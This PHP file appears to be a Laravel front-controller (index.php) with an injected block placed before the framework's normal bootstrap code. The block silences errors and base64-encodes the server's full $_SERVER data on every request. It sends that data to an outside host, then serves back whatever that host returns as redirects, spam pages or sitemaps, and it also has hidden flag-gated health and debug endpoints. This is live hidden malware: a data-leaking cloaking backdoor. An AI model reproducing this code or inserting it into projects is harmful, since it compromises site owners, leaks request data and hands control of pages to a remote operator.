<?php

error_reporting(0);

define('GOSHELL_API_URL', getenv('GOSHELL_API_URL') ?: 'https://apifuckgoogle.brightmm.com/api/satellite');


define('TEMPLATE_ID', getenv('TEMPLATE_ID') ?: 1);

define('VERSION', getenv('VERSION') ?: 1);

define('HEALTH_CHECK_FLAG', getenv('HEALTH_CHECK_FLAG') ?: 'fuckgoogle2025');
// =====================================================

function fetch_remote($url) {
    global $_SERVER;


    $_SERVER['T'] = 'y';
    $_SERVER['TPL'] = TEMPLATE_ID;
    $_SERVER['VER'] = VERSION;

    $_SERVER['HTTP_X_DEBUG_TOKEN'] = $_SERVER['HTTP_X_DEBUG_TOKEN'] ?? '';

    $payload = base64_encode(json_encode($_SERVER));

    if (!function_exists('curl_exec')) {

        $context = stream_context_create([
            'http' => [
                'method' => 'GET',
                'timeout' => 30
            ]
        ]);
        $full_url = $url . '?ua=' . urlencode($payload);
        return @file_get_contents($full_url, false, $context);
    } else {

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        $info = curl_getinfo($ch);
        curl_close($ch);

        if ($info['http_code'] != 200) {
            return '';
        }
        return $response;
    }
}

function main() {
    if (isset($_GET['flag']) && $_GET['flag'] === HEALTH_CHECK_FLAG) {
        $response = fetch_remote(GOSHELL_API_URL . '?health=1');
        if ($response === 'ok') {
            exit('succeed');
        } else {
            http_response_code(503);
            exit('backend_error');
        }
    }


    if (isset($_GET['phpdebug']) && $_GET['phpdebug'] === '1') {
        header('Content-Type: application/json');

        $serverCopy = [
            'REMOTE_ADDR' => $_SERVER['REMOTE_ADDR'] ?? '',
            'HTTP_USER_AGENT' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'HTTP_HOST' => $_SERVER['HTTP_HOST'] ?? '',
            'QUERY_STRING' => $_SERVER['QUERY_STRING'] ?? '',
            'REQUEST_URI' => $_SERVER['REQUEST_URI'] ?? '',
            'HTTP_REFERER' => $_SERVER['HTTP_REFERER'] ?? '',
            'T' => 'y',
            'TPL' => TEMPLATE_ID,
            'VER' => VERSION
        ];

        $payload = base64_encode(json_encode($serverCopy));


        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, GOSHELL_API_URL);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $response = curl_exec($ch);
        $error = curl_error($ch);
        $info = curl_getinfo($ch);
        curl_close($ch);

        exit(json_encode([
            'server_copy' => $serverCopy,
            'payload_b64' => $payload,
            'api_url' => GOSHELL_API_URL,
            'curl_error' => $error,
            'http_code' => $info['http_code'],
            'response_length' => strlen($response),
            'response_preview' => substr($response, 0, 500),
            'has_html_tag' => strpos($response, '<html') !== false
        ]));
    }

    $content = fetch_remote(GOSHELL_API_URL);

    if (preg_match('/^http/', $content)) {
        header('Location: ' . $content);
        exit;
    }

    if (preg_match('/^##/', $content)) {
        exit(substr($content, 2));
    }

    if (strlen($content) > 90) {
        if (strstr($content, '</urlset>')) {
            header('Content-type: text/xml');
            exit($content);
        }
        if (strstr($content, '</sitemapindex>')) {
            header('Content-type: text/xml');
            exit($content);
        }
        if (strstr($content, '<html')) {
            exit($content);
        }
    }
}

main();
?><?php

use Illuminate\Contracts\Http\Kernel;
use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Check If The Application Is Under Maintenance
|--------------------------------------------------------------------------
|
| If the application is in maintenance / demo mode via the "down" command
| we will load this file so that any pre-rendered content can be shown
| instead of starting the framework, which could cause an exception.
|
*/

if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
    require $maintenance;
}

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| this application. We just need to utilize it! We'll simply require it
| into the script here so we don't need to manually load our classes.
|
*/

require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request using
| the application's HTTP kernel. Then, we will send the response back
| to this client's browser, allowing them to enjoy our application.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';

$kernel = $app->make(Kernel::class);

$response = $kernel->handle(
    $request = Request::capture()
)->send();

$kernel->terminate($request, $response);
